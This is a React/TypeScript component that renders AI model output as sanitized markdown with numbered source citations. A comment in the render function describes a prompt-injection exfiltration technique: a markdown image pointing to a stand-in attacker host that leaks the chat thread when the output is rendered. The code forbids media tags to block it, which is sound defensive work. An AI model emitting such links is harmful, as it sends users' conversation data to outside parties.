// SPDX-License-Identifier: MIT-0
import DOMPurify from 'dompurify'
import { marked } from 'marked'
import { useMemo } from 'react'

import { useSource } from '~/api/hooks'

const CITE = /\[(src_[0-9A-Za-z]+)\]/g

// Links in model output leave the app in a new tab, so a live stream is not torn down.
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
	if (node.tagName === 'A' && /^https?:/.test(node.getAttribute('href') ?? '')) {
		node.setAttribute('target', '_blank')
		node.setAttribute('rel', 'noopener noreferrer')
	}
})

/** Numbers each distinct `[src_…]` in first-appearance order, as the PDF export does. */
function render(text: string): { html: string; sources: string[] } {
	const sources: string[] = []
	const cited = text.replace(CITE, (_, uid: string) => {
		let n = sources.indexOf(uid) + 1
		if (n === 0) n = sources.push(uid)
		return `<sup class="cite">[${n}]</sup>`
	})
	// No media or inline style: a prompt-injected `![](https://attacker/?d=…)` leaks the thread
	// on render, without a click.
	const html = DOMPurify.sanitize(marked.parse(cited, { async: false }), {
		FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio'],
		FORBID_ATTR: ['style'],
	})
	return { html, sources }
}

function SourceItem({ uid }: { uid: string }) {
	const { data, isError } = useSource(uid)
	if (isError) return <li className="text-fg-muted">{uid}</li>
	if (!data) return <li className="text-fg-muted">…</li>
	return (
		<li>
			<a href={data.url} target="_blank" rel="noopener noreferrer" className="underline">
				{data.title || data.url}
			</a>
		</li>
	)
}

export function Markdown({ text }: { text: string }) {
	const { html, sources } = useMemo(() => render(text), [text])
	return (
		<div>
			{/* biome-ignore lint/security/noDangerouslySetInnerHtml: sanitized by DOMPurify above */}
			<div className="md" dangerouslySetInnerHTML={{ __html: html }} />
			{sources.length > 0 && (
				<div className="mt-3 border-t border-line pt-2 text-xs">
					<div className="mb-1 font-medium text-fg-muted">Sources</div>
					<ol className="list-decimal space-y-0.5 pl-5">
						{sources.map((uid) => (
							<SourceItem key={uid} uid={uid} />
						))}
					</ol>
				</div>
			)}
		</div>
	)
}

// vim: ts=4
